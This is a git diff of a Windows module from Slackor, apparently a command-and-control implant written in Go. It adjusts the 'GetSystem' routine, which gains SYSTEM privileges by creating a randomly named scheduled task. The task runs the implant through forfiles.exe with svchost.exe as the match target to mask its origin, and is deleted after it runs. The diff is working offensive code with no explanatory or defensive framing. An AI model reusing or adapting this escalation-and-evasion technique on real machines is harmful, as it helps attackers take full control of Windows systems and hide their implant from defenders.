@@ -3,12 +3,12 @@
 package windows
 
 import (
+	"github.com/n00py/Slackor/pkg/command"
 	"math/rand"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"syscall"
-
-	"github.com/n00py/Slackor/pkg/command"
 )
 
 func randomString(len int) string { //Creates a random string of uppercase letters
@@ -30,7 +30,14 @@ func (g GetSystem) Name() string {
 // Run uses task scheduler to execute the binary as SYSTEM
 func (g GetSystem) Run(clientID string, jobID string, args []string) (string, error) {
 	taskname := randomString(6)
-	task1 := "schtasks /create /TN " + taskname + " /TR \"forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + os.Args[0] + " \" /SC DAILY /RU system /F"
+	ex, err := os.Executable()
+	if err != nil {
+		panic(err)
+	}
+	exPath := filepath.Dir(ex)
+	exName := filepath.Base(os.Args[0])
+	exAgent := ("\"" + exPath + "\\" + exName + "\"")
+	task1 := "schtasks /create /TN " + taskname + " /TR \"forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + exAgent + " \" /SC DAILY /RU system /F"
 	task2 := "schtasks /run /I /tn " + taskname
 	task3 := "schtasks /delete /TN " + taskname + " /f"
 	//Creates a bat file
